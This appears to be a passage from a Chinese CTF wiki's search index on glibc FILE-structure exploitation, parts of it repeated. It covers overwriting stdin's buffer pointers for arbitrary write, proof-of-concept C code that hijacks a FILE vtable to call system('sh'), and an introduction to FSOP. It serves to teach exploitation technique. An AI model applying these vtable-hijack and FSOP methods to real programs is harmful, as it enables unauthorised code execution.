\u5728\u6267\u884c\u7a0b\u5e8f\u7b2c\u4e00\u6b21\u4f7f\u7528stdin\u4e4b\u524d\uff0cstdin\u7684\u5185\u5bb9\u8fd8\u672a\u521d\u59cb\u5316\u662f\u7a7a\u7684 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2088 0x0000000000000000 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 <== vtable \u8c03\u7528scanf\u4e4b\u540e\u53ef\u4ee5\u770b\u5230_IO_read_ptr\u3001_IO_read_base\u3001_IO_read_end\u3001_IO_buf_base\u3001_IO_buf_end\u7b49\u57df\u90fd\u88ab\u521d\u59cb\u5316 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000602410 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u8fdb\u4e00\u6b65\u601d\u8003\u53ef\u4ee5\u53d1\u73b0\u5176\u5b9estdin\u521d\u59cb\u5316\u7684\u5185\u5b58\u662f\u5728\u5806\u4e0a\u5206\u914d\u51fa\u6765\u7684\uff0c\u5728\u8fd9\u91cc\u5806\u7684\u57fa\u5740\u662f0x602000\uff0c\u56e0\u4e3a\u4e4b\u524d\u6ca1\u6709\u5806\u5206\u914d\u56e0\u6b64\u7f13\u51b2\u533a\u7684\u5730\u5740\u4e5f\u662f0x602010 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/tst/1/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/tst/1/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] \u5206\u914d\u7684\u5806\u5927\u5c0f\u662f0x400\u4e2a\u5b57\u8282\uff0c\u6b63\u597d\u5bf9\u5e94\u4e8e_IO_buf_base\uff5e_IO_buf_end \u5728\u8fdb\u884c\u5199\u5165\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u7f13\u51b2\u533a\u4e2d\u6709\u6211\u4eec\u5199\u5165\u7684\u6570\u636e\uff0c\u4e4b\u540e\u76ee\u7684\u5730\u5740\u6808\u4e2d\u7684\u7f13\u51b2\u533a\u4e5f\u4f1a\u5199\u5165\u6570\u636e 0x602000: 0x0000000000000000 0x0000000000000411 <== \u5206\u914d0x400\u5927\u5c0f 0x602010: 0x000000000a333231 0x0000000000000000 <== \u7f13\u51b2\u6570\u636e 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 \u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u4fee\u6539_IO_buf_base\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u5168\u5c40\u7f13\u51b2\u533abuf\u7684\u5730\u5740\u662f0x7ffff7dd2740\u3002\u4fee\u6539_IO_buf_base\u548c_IO_buf_end\u5230\u7f13\u51b2\u533abuf\u7684\u5730\u5740 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x00007ffff7dd2740 <== _IO_buf_base 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x00007ffff7dd27c0 0x0000000000000000 <== _IO_buf_end 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 \u4e4b\u540escanf\u7684\u8bfb\u5165\u6570\u636e\u5c31\u4f1a\u5199\u5165\u52300x7ffff7dd2740\u7684\u4f4d\u7f6e 0x7ffff7dd2740 <buf>: 0x00000a6161616161 0x0000000000000000 0x7ffff7dd2750 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2760 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2770 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2780 <buffer>: 0x0000000000000000 0x0000000000000000","title":"\u793a\u4f8b"},{"location":"pwn/io_file/fake-vtable-exploit/","text":"\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b \u00b6 \u7b80\u4ecb \u00b6 \u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86Linux\u4e2d\u6587\u4ef6\u6d41\u7684\u7279\u6027\uff08FILE\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5Linux\u4e2d\u7684\u4e00\u4e9b\u5e38\u89c1\u7684IO\u64cd\u4f5c\u51fd\u6570\u90fd\u9700\u8981\u7ecf\u8fc7FILE\u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f_IO_FILE_plus\u7ed3\u6784\u4e2d\u5b58\u5728vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002 \u56e0\u6b64\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f\u9488\u5bf9_IO_FILE_plus\u7684vtable\u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628avtable\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002 \u56e0\u6b64vtable\u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6vtable\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002 \u5b9e\u8df5 \u00b6 \u8fd9\u91cc\u6f14\u793a\u4e86\u4fee\u6539vtable\u4e2d\u7684\u6307\u9488\uff0c\u9996\u5148\u9700\u8981\u77e5\u9053_IO_FILE_plus\u4f4d\u4e8e\u54ea\u91cc\uff0c\u5bf9\u4e8efopen\u7684\u60c5\u51b5\u4e0b\u662f\u4f4d\u4e8e\u5806\u5185\u5b58\uff0c\u5bf9\u4e8estdin\\stdout\\stderr\u662f\u4f4d\u4e8elibc.so\u4e2d\u3002 int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\"); } \u6839\u636evtable\u5728_IO_FILE_plus\u7684\u504f\u79fb\u5f97\u5230vtable\u7684\u5730\u5740\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f0xd8\u3002\u4e4b\u540e\u9700\u8981\u641e\u6e05\u695a\u6b32\u52ab\u6301\u7684IO\u51fd\u6570\u4f1a\u8c03\u7528vtable\u4e2d\u7684\u54ea\u4e2a\u51fd\u6570\u3002\u5173\u4e8eIO\u51fd\u6570\u8c03\u7528vtable\u7684\u60c5\u51b5\u5df2\u7ecf\u5728FILE\u7ed3\u6784\u4ecb\u7ecd\u4e00\u8282\u7ed9\u51fa\u4e86\uff0c\u77e5\u9053\u4e86printf\u4f1a\u8c03\u7528vtable\u4e2d\u7684xsputn\uff0c\u5e76\u4e14xsputn\u7684\u662fvtable\u4e2d\u7b2c\u516b\u9879\u4e4b\u540e\u5c31\u53ef\u4ee5\u5199\u5165\u8fd9\u4e2a\u6307\u9488\u8fdb\u884c\u52ab\u6301\u3002 \u5e76\u4e14\u5728xsputn\u7b49vtable\u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684_IO_FILE_plus\u5730\u5740\u3002\u6bd4\u5982\u8fd9\u4f8b\u5b50\u8c03\u7528printf\uff0c\u4f20\u9012\u7ed9vtable\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f_IO_2_1_stdout_\u7684\u5730\u5740\u3002 \u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684vtable\u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982 #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,\"sh\",3); vtable_ptr[7]=system_ptr //xsputn fwrite(\"hi\",2,1,fp); } \u4f46\u662f\u5728\u76ee\u524dlibc2.23\u7248\u672c\u4e0b\uff0c\u4f4d\u4e8elibc\u6570\u636e\u6bb5\u7684vtable\u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684\u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020vtable\u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002 #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp); } \u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e\u4f2a\u9020\u7684vtable\uff0c\u4e4b\u540e\u4fee\u6539_IO_FILE_plus\u7684vtable\u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58\u3002\u56e0\u4e3avtable\u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662fsystem\u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570\"/bin/sh\"\u6216\"sh\"\u3002 \u56e0\u4e3avtable\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a\"sh\"\u5199\u5165_IO_FILE_plus\u5934\u90e8\u3002\u4e4b\u540e\u5bf9fwrite\u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684vtable\u6267\u884csystem(\"sh\")\u3002 \u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728fopen\u7b49\u51fd\u6570\u521b\u5efa\u7684_IO_FILE\u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9stdin\\stdout\\stderr\u7b49\u4f4d\u4e8elibc.so\u4e2d\u7684_IO_FILE\uff0c\u8fd9\u4e9b\u6d41\u5728printf\\scanf\u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728libc2.23\u4e4b\u524d\uff0c\u8fd9\u4e9bvtable\u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002 print &_IO_2_1_stdin_ $2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 <_IO_2_1_stdin_> 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so","title":"\u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"},{"location":"pwn/io_file/fake-vtable-exploit/#vtable","text":"","title":"\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"},{"location":"pwn/io_file/fake-vtable-exploit/#_1","text":"\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86Linux\u4e2d\u6587\u4ef6\u6d41\u7684\u7279\u6027\uff08FILE\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5Linux\u4e2d\u7684\u4e00\u4e9b\u5e38\u89c1\u7684IO\u64cd\u4f5c\u51fd\u6570\u90fd\u9700\u8981\u7ecf\u8fc7FILE\u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f_IO_FILE_plus\u7ed3\u6784\u4e2d\u5b58\u5728vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002 \u56e0\u6b64\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f\u9488\u5bf9_IO_FILE_plus\u7684vtable\u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628avtable\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002 \u56e0\u6b64vtable\u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6vtable\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002","title":"\u7b80\u4ecb"},{"location":"pwn/io_file/fake-vtable-exploit/#_2","text":"\u8fd9\u91cc\u6f14\u793a\u4e86\u4fee\u6539vtable\u4e2d\u7684\u6307\u9488\uff0c\u9996\u5148\u9700\u8981\u77e5\u9053_IO_FILE_plus\u4f4d\u4e8e\u54ea\u91cc\uff0c\u5bf9\u4e8efopen\u7684\u60c5\u51b5\u4e0b\u662f\u4f4d\u4e8e\u5806\u5185\u5b58\uff0c\u5bf9\u4e8estdin\\stdout\\stderr\u662f\u4f4d\u4e8elibc.so\u4e2d\u3002 int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\"); } \u6839\u636evtable\u5728_IO_FILE_plus\u7684\u504f\u79fb\u5f97\u5230vtable\u7684\u5730\u5740\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f0xd8\u3002\u4e4b\u540e\u9700\u8981\u641e\u6e05\u695a\u6b32\u52ab\u6301\u7684IO\u51fd\u6570\u4f1a\u8c03\u7528vtable\u4e2d\u7684\u54ea\u4e2a\u51fd\u6570\u3002\u5173\u4e8eIO\u51fd\u6570\u8c03\u7528vtable\u7684\u60c5\u51b5\u5df2\u7ecf\u5728FILE\u7ed3\u6784\u4ecb\u7ecd\u4e00\u8282\u7ed9\u51fa\u4e86\uff0c\u77e5\u9053\u4e86printf\u4f1a\u8c03\u7528vtable\u4e2d\u7684xsputn\uff0c\u5e76\u4e14xsputn\u7684\u662fvtable\u4e2d\u7b2c\u516b\u9879\u4e4b\u540e\u5c31\u53ef\u4ee5\u5199\u5165\u8fd9\u4e2a\u6307\u9488\u8fdb\u884c\u52ab\u6301\u3002 \u5e76\u4e14\u5728xsputn\u7b49vtable\u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684_IO_FILE_plus\u5730\u5740\u3002\u6bd4\u5982\u8fd9\u4f8b\u5b50\u8c03\u7528printf\uff0c\u4f20\u9012\u7ed9vtable\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f_IO_2_1_stdout_\u7684\u5730\u5740\u3002 \u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684vtable\u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982 #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,\"sh\",3); vtable_ptr[7]=system_ptr //xsputn fwrite(\"hi\",2,1,fp); } \u4f46\u662f\u5728\u76ee\u524dlibc2.23\u7248\u672c\u4e0b\uff0c\u4f4d\u4e8elibc\u6570\u636e\u6bb5\u7684vtable\u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684\u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020vtable\u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002 #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp); } \u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e\u4f2a\u9020\u7684vtable\uff0c\u4e4b\u540e\u4fee\u6539_IO_FILE_plus\u7684vtable\u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58\u3002\u56e0\u4e3avtable\u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662fsystem\u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570\"/bin/sh\"\u6216\"sh\"\u3002 \u56e0\u4e3avtable\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a\"sh\"\u5199\u5165_IO_FILE_plus\u5934\u90e8\u3002\u4e4b\u540e\u5bf9fwrite\u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684vtable\u6267\u884csystem(\"sh\")\u3002 \u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728fopen\u7b49\u51fd\u6570\u521b\u5efa\u7684_IO_FILE\u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9stdin\\stdout\\stderr\u7b49\u4f4d\u4e8elibc.so\u4e2d\u7684_IO_FILE\uff0c\u8fd9\u4e9b\u6d41\u5728printf\\scanf\u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728libc2.23\u4e4b\u524d\uff0c\u8fd9\u4e9bvtable\u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002 print &_IO_2_1_stdin_ $2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 <_IO_2_1_stdin_> 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so","title":"\u5b9e\u8df5"},{"location":"pwn/io_file/fsop/","text":"FSOP \u00b6 \u4ecb\u7ecd \u00b6 FSOP\u662fFile Stream Oriented Programming\u7684\u7f29\u5199\uff0c\u6839\u636e\u524d\u9762\u5bf9FILE\u7684\u4ecb\u7ecd\u5f97\u77e5\u8fdb\u7a0b\u5185\u6240\u6709\u7684_IO_FILE\u7ed3\u6784\u4f1a\u4f7f\u7528_chain\u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531_IO_list_all\u7ef4\u62a4\u3002 FSOP\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301_IO_list_all\u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684_IO_FILE\u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP\u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528_IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0_IO_list_all\u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2aFILE\u8c03\u7528fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528_IO_FILE_plus.vtable\u4e2d\u7684_IO_overflow\u3002 int _IO_flush_all_lockp (int do_lock) { ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { ... if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } ... } } \u800c_IO_flush_all_lockp\u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a 1.\u5f53libc\u6267\u884cabort\u6d41\u7a0b\u65f6 2.\u5f53\u6267\u884cexit\u51fd\u6570\u65f6 3.\u5f53\u6267\u884c\u6d41\u4ecemain\u51fd\u6570\u8fd4\u56de\u65f6 \u793a\u4f8b \u00b6 \u68b3\u7406\u4e00\u4e0bFSOP\u5229\u7528\u7684\u6761\u4ef6\uff0c\u9996\u5148\u9700\u8981\u653b\u51fb\u8005\u83b7\u77e5libc.so\u57fa\u5740\uff0c\u56e0\u4e3a_IO_list_all\u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728libc.so\u4e2d\u7684\uff0c\u4e0d\u6cc4\u6f0flibc\u57fa\u5740\u5c31\u4e0d\u80fd\u6539\u5199_IO_list_all\u3002 \u4e4b\u540e\u9700\u8981\u7528\u4efb\u610f\u5730\u5740\u5199\u628a_IO_list_all\u7684\u5185\u5bb9\u6539\u4e3a\u6307\u5411\u6211\u4eec\u53ef\u63a7\u5185\u5b58\u7684\u6307\u9488\uff0c \u4e4b\u540e\u7684\u95ee\u9898\u662f\u5728\u53ef\u63a7\u5185\u5b58\u4e2d\u5e03\u7f6e\u4ec0\u4e48\u6570\u636e\uff0c\u6beb\u65e0\u7591\u95ee\u7684\u662f\u9700\u8981\u5e03\u7f6e\u4e00\u4e2a\u6211\u4eec\u7406\u60f3\u51fd\u6570\u7684vtable\u6307\u9488\u3002\u4f46\u662f\u4e3a\u4e86\u80fd\u591f\u8ba9\u6211\u4eec\u6784\u9020\u7684fake_FILE\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fd8\u9700\u8981\u5e03\u7f6e\u4e00\u4e9b\u5176\u4ed6\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u4f9d\u636e\u662f\u6211\u4eec\u524d\u9762\u7ed9\u51fa\u7684 if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF) { result = EOF; } \u4e5f\u5c31\u662f fp->_mode <= 0 fp->_IO_write_ptr > fp->_IO_write_base \u5728\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u6211\u4eec\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020\u7684vtable\u548c_IO_FILE_plus\u3002 